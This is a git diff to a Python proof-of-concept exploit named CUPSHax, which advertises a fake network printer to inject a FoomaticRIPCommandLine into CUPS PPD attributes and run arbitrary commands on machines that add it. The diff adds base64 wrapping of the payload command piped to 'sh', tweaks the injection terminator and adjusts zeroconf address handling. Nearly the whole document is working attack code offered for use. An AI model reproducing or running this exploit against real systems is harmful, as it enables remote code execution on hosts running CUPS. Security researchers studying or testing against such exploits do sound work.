@@ -2,6 +2,7 @@ from uuid import uuid4
 from threading import Thread
 import argparse
 import socket
+from base64 import b64encode
 from zeroconf import ServiceInfo, Zeroconf
 from ippserver.behaviour import StatelessPrinter
 from ippserver.server import IPPServer, IPPRequestHandler
@@ -13,7 +14,7 @@ class Discovery:
     def __init__(self, printer_name, ip_address, port):
         self.printer_name = printer_name
         self.printer_name_slug = Discovery.slugify_name(printer_name)
-        self.ip_address = socket.inet_aton(ip_address)
+        self.ip_address = ip_address
         self.port = port
         self.zeroconf = None
 
@@ -43,7 +44,7 @@ class Discovery:
         service_info = ServiceInfo(
             service_type,
             service_name,
-            addresses=[self.ip_address],
+            addresses=[socket.inet_aton(self.ip_address)],
             port=self.port,
             properties=txt_records,
             server=f"{self.printer_name_slug}.local.",
@@ -69,7 +70,7 @@ class Discovery:
 class HaxPrinter(StatelessPrinter):
     def __init__(self, command, name):
         self.cups_filter = '*cupsFilter2: "application/vnd.cups-pdf application/pdf 0 foomatic-rip"'
-        self.foomatic_rip = f'*FoomaticRIPCommandLine: {command};#'
+        self.foomatic_rip = f'*FoomaticRIPCommandLine: {command} #'
         self.name = name
         super(HaxPrinter, self).__init__()
 
@@ -234,20 +235,29 @@ class HaxPrinter(StatelessPrinter):
         }
         return attr
 
+    def handle_postscript(self, _ipp_request, _postscript_file):
+        pass
+
 def parse_args():
-    parser = argparse.ArgumentParser(description="A script for executing commands remotely")
+    parser = argparse.ArgumentParser(description="CUPSHax: A CUPS PPD injection PoC")
     
     parser.add_argument("--name", default="RCE Printer", help="The name to use (default: RCE Printer)")
     parser.add_argument("--ip", required=True, help="The IP address of the machine running this script")
     parser.add_argument("--command", default="touch /tmp/pwn", help="The command to execute (default: 'touch /tmp/pwn')")
     parser.add_argument("--port", type=int, default=8631, help="The port to connect on (default: 8631)")
+    parser.add_argument("--base64", action=argparse.BooleanOptionalAction, default=True, help="Wrap the command in base64 (default: enabled)")
     
     return parser.parse_args()
 
 def main():
     args = parse_args()
+    command = args.command
+    if args.base64:
+        print("[+] Wrapping command in base64...")
+        command = f"echo {b64encode(command.encode()).decode()}|base64 -d|sh"
 
-    printer = HaxPrinter(args.command, args.name)
+    print(f"[+] Command: {command}")
+    printer = HaxPrinter(command, args.name)
     discovery = Discovery(args.name, args.ip, args.port)
     
     # Start a discovery thread
@@ -259,11 +269,7 @@ def main():
         print(f"[+] Starting IPP server on {args.ip}:{args.port}...")
         server.serve_forever()
     except KeyboardInterrupt:
-        pass
-    finally:
-        server.server_close()
-        discovery.close()
-
+        print("[+] Stopping script...")
 
 if __name__ == "__main__":
     main()
